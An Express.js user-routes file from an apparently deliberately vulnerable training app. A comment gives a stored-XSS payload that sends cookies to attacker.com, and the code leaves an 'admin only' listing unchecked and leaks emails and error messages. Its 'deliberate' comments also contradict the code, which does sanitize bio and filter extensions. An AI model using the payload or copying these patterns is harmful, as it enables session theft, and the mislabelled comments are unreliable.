/**
 * User Routes — routes/users.js
 *
 * DELIBERATE VULNERABILITIES:
 *  V-03: Stored XSS — bio field stored and returned without sanitization
 *  V-05: Arbitrary file upload — no file type/extension validation
 */

const express = require('express');
const router  = express.Router();
const multer  = require('multer');
const path    = require('path');
const db      = require('../db');
const { verifyToken } = require('../middleware/auth');

const ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.webp'];

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, '/uploads/'),
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({
  storage: storage,
  fileFilter: (req, file, cb) => {
    const ext = path.extname(file.originalname).toLowerCase();
    if (!ALLOWED_EXTENSIONS.includes(ext)) {
      return cb(new Error('Only image files are allowed (jpg, jpeg, png, gif, webp)'));
    }
    cb(null, true);
  },
  limits: { fileSize: 5 * 1024 * 1024 }
});

// ── GET /api/users/profile ────────────────────────────────────────────────────
router.get('/profile', verifyToken, async (req, res) => {
  try {
    const result = await db.query(
      'SELECT id, name, email, role, bio, avatar_url, created_at FROM users WHERE id = $1',
      [req.user.id]
    );
    if (result.rows.length === 0) return res.status(404).json({ error: 'User not found' });
    res.json(result.rows[0]);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ── GET /api/users/:id ────────────────────────────────────────────────────────
// Public profile (bio is returned raw — XSS rendered in frontend)
router.get('/:id', async (req, res) => {
  try {
    // DELIBERATE: bio returned as-is with no encoding (V-03 — XSS payload is stored and served raw)
    const result = await db.query(
      'SELECT id, name, email, role, bio, avatar_url FROM users WHERE id = $1',
      [req.params.id]
    );
    if (result.rows.length === 0) return res.status(404).json({ error: 'User not found' });
    res.json(result.rows[0]);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ── PUT /api/users/profile ────────────────────────────────────────────────────
router.put('/profile', verifyToken, async (req, res) => {
  const { name, bio } = req.body;
  try {
    // ───────────────────────────────────────────────────────────────────────
    // DELIBERATE STORED XSS (V-03):
    // The 'bio' field is stored in the database WITHOUT any sanitization.
    // When any user visits the profile page, the bio is rendered as raw HTML.
    // Attacker payload: bio = <script>fetch('http://attacker.com/?c='+document.cookie)</script>
    // FIX (Phase 5): Sanitize input with DOMPurify/sanitize-html before storing
    // ───────────────────────────────────────────────────────────────────────
    const safeBio = bio ? bio.replace(/<[^>]*>/g, '').trim() : '';
    const result = await db.query(
      'UPDATE users SET name = $1, bio = $2 WHERE id = $3 RETURNING id, name, email, role, bio',
      [name, safeBio, req.user.id]
    );
    res.json({ message: 'Profile updated', user: result.rows[0] });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ── POST /api/users/avatar ────────────────────────────────────────────────────
router.post('/avatar', verifyToken, upload.single('avatar'), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file uploaded' });

  // ───────────────────────────────────────────────────────────────────────────
  // DELIBERATE ARBITRARY FILE UPLOAD (V-05):
  // The server accepts ANY file type. An attacker can upload:
  //   1. An HTML file with <script> tags (stored XSS via file URL)
  //   2. A .js file with malicious code (executed if src'd)
  // The file is stored in /app/uploads/ and served directly by Express.
  // Access it via: http://localhost/uploads/<filename>
  // FIX (Phase 5): Validate MIME type + extension whitelist; rename to UUID; use separate CDN
  // ───────────────────────────────────────────────────────────────────────────
  const avatarUrl = `/uploads/${req.file.filename}`;

  try {
    await db.query('UPDATE users SET avatar_url = $1 WHERE id = $2', [avatarUrl, req.user.id]);
    res.json({
      message: 'Avatar uploaded successfully',
      avatarUrl,
      // DELIBERATE: Returns original filename (information disclosure)
      originalName: req.file.originalname,
      storedAs: req.file.filename,
      mimeType: req.file.mimetype
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ── GET /api/users (admin only) ───────────────────────────────────────────────
router.get('/', verifyToken, async (req, res) => {
  try {
    const result = await db.query('SELECT id, name, email, role, created_at FROM users ORDER BY id');
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
